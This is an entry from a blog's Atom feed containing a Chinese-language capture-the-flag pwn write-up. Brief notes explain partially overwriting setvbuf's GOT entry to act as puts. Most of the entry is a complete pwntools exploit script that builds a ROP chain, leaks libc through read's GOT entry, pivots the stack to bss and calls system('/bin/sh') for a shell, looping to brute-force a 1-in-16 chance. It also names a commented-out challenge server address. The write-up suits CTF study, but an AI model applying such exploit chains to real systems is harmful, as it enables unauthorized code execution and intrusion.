    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>无输出函数，尝试使用__do_global_dtors_aux时发现在栈上并没有残留的地址。</p><p>由于read()函数为该程序唯一输入程序，不考虑对其下手。剩下有realpath()函数和setvbuf()函数，realpath()函数为比较高级的函数，其附近的函数不好利用，而根据提供的libc库文件发现setvbuf()函数距离puts()函数非常的近，考虑用read()函数构造ROP修改setvbuf()got表的后两位，将其修改为puts()函数，由于修改了倒数第二位，所以每次只有1/16的几率修改成功。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># r=remote(&#x27;81.69.0.47&#x27;,2212)</span></span><br><span class="line">        r=process(<span class="string">&#x27;./pwn222&#x27;</span>)</span><br><span class="line">        elf = ELF(<span class="string">&#x27;./pwn222&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc&#x27;</span>)</span><br><span class="line">        rdi = <span class="number">0x401233</span></span><br><span class="line">        rsir15 = <span class="number">0x401231</span></span><br><span class="line">        leave = <span class="number">0x4011aa</span></span><br><span class="line">        bss = <span class="number">0x404500</span></span><br><span class="line">        setvbuf_got = elf.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">        read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">        fake_puts = elf.symbols[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">        read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(setvbuf_got)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#r.sendline(cyclic(32)+p64(bss-8)+p64(rdi)+p64(0)+p64(rsir15)+p64(setvbuf_got)+p64(0))</span></span><br><span class="line">        make_puts = p64(rdi)+p64(<span class="number">0</span>)+p64(rsir15)+p64(setvbuf_got)+p64(<span class="number">0</span>)+p64(read)</span><br><span class="line">        leak_read = p64(rdi)+p64(read_got)+p64(fake_puts)</span><br><span class="line">        move_stack = p64(rdi)+p64(<span class="number">0</span>)+p64(rsir15)+p64(bss)+p64(<span class="number">0</span>)+p64(read)+p64(leave)</span><br><span class="line">        exp = make_puts + leak_read + move_stack</span><br><span class="line"></span><br><span class="line">        r.sendline(cyclic(<span class="number">32</span>)+p64(bss-<span class="number">8</span>)+exp)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        r.send(p16(<span class="number">0xf6a0</span>))</span><br><span class="line">        libc_addr = u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>) - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">        system = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        r.sendline(p64(rdi)+p64(binsh)+p64(system))</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
</feed>
